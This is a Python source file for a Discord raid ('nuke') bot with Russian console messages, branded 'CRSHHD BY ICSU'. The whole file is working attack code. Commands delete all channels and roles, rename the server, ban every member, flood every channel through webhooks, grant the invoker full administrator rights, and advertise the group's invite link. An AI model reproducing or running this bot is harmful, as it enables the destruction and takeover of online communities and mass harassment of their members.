import discord, colorama, asyncio, datetime
from discord.ext import commands
from discord import Permissions
from aiofile import async_open
from colorama import Fore, init

init()

with open("token.txt", "r", encoding="utf-8") as f:
    TOKEN = f.read().strip()
    print(Fore.GREEN + "[+] - Токены прочитаны. Не забудьте включить все интенты для бота на сайте Discord Developer Portal")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command("help")

CRASH_CHANNEL_NAME = "☠-crashed-by-icsu-{}"
CRASH_SERVER_NAME = ">>CRSHHD BY ICSU>>"
CRASH_DESCRIPTION = (
    "Сервер захвачен группировкой СЕООИ, переходите на наш сервер >>> https://discord.gg/jPzvYYjRSd"
)
ICON_PATH = "icon.png"


@bot.event
async def on_ready():
    activity = discord.Activity(type=discord.ActivityType.watching, name="https://discord.gg/jPzvYYjRSd")
    await bot.change_presence(status=discord.Status.online, activity=activity)
    print(Fore.GREEN + f"[+] Бот запущен как {bot.user}")
    print(Fore.WHITE + "Все команды:")
    print("!nuke - автоматический краш сервера")
    print("!admin - выдача прав администратора")
    print("!ban_all - банит всех пользователей")
    print("!spam - спамит во всех каналах")


@bot.command()
async def banall(ctx):
    await ctx.message.delete()
    print(Fore.YELLOW + "[~] Выполняется !ban-all")

    for member in ctx.guild.members:
        if member == ctx.author or member == bot.user:
            continue
        try:
            await member.ban(reason="CRSHHD BY ICSU")
            print(Fore.GREEN + f"[+] Забанен: {member}")
        except:
            print(Fore.RED + "[-] Не удалось забанить: {member}")

async def spm_hook(webhook):
    for i in range(30):
        try:
            async with async_open("text.txt","r", encoding="utf-8") as raid_txt:
                await webhook.send(await raid_txt.read())
        except:
            pass

async def create_hook(ctx):
    for chan in ctx.guild.channels:
        webhook = await chan.create_webhook(name='ICSU')
        async with async_open(ICON_PATH,'rb') as pfp:
            await webhook.edit(avatar=await pfp.read())

        asyncio.create_task(spm_hook(webhook))  

@bot.command()
async def spam(ctx):
    await ctx.message.delete()
    print(Fore.YELLOW + "[~] Выполняется !spam")
    asyncio.create_task(create_hook(ctx))
    await asyncio.sleep(10)
    print(Fore.GREEN + "[+] Спам завершен.")


async def wipe_channels(guild, create_one=False):
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass


async def create_crash_channels(guild):
    channels = []
    for i in range(15):
        try:
            ch = await guild.create_text_channel(CRASH_CHANNEL_NAME.format(i))
            channels.append(ch)
        except:
            continue
    return channels


async def delete_roles(guild):
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except:
                continue


async def create_roles(guild):
    for _ in range(10):
        try:
            await guild.create_role(name="CRSHHD BY ICSU", permissions=Permissions.none())
        except:
            continue


@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    print(Fore.YELLOW + "[~] Выполняется !nuke")

        
    async with async_open(ICON_PATH, "rb") as icon:
        await guild.edit(icon=await icon.read())

    await guild.edit(name=CRASH_SERVER_NAME, description=CRASH_DESCRIPTION)
    start_time = discord.utils.utcnow() + datetime.timedelta(minutes=1)
    end_time = start_time + datetime.timedelta(days=365)

    try:
        event = await guild.create_scheduled_event(
            name="ICSU links",
            description="Discord: https://discord.gg/jPzvYYjRSd\nYouTube: https://www.youtube.com/@icsunew\nGitHub: https://github.com/xnnder",
            start_time=start_time,
            end_time=end_time,
            entity_type=discord.EntityType.external,
            location="https://discord.gg/jPzvYYjRSd",
            privacy_level=discord.PrivacyLevel.guild_only,
        )
    except discord.Forbidden:
        await ctx.send(Fore.RED +"У бота нет прав на создание событий.")
    except Exception as e:
        await ctx.send(Fore.RED + f"Ошибка при создании события: {e}")

    asyncio.gather(
        wipe_channels(guild),
        create_crash_channels(guild),
        delete_roles(guild),
        create_roles(guild)
        )
    

    await asyncio.sleep(10)

    print(Fore.GREEN + "[+] Краш завершен.")


@bot.event
async def on_guild_channel_create(channel):
    if channel.name.startswith("☠-crashed-by-icsu-"):
        webhook = await channel.create_webhook(name="ICSU", avatar=await channel.guild.icon.read())
        for i in range(30):
            try:
                async with async_open("text.txt","r", encoding="utf-8") as raid_txt:
                    await webhook.send(await raid_txt.read())
            except:
                pass
        else:
            return

@bot.command()
async def admin(ctx):
    await ctx.message.delete()
    print(Fore.YELLOW + "[~] Выполняется !admin")

    guild = ctx.guild
    role_name = "ICSU ADMIN"
    role = discord.utils.get(guild.roles, name=role_name)

    if not role:
        role = await guild.create_role(
            name=role_name, permissions=Permissions.all()
        )

    await ctx.author.add_roles(role)
    print(Fore.GREEN + f"[+] Выдана роль {role_name} пользователю {ctx.author}")



bot.run(TOKEN, log_handler=None)

